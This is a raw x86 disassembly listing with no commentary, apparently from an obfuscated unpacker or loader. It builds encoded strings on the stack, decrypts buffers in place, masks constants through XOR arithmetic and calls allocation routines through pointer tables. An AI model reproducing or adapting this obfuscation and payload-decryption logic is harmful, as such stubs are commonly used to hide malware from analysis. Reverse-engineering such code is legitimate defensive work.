  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
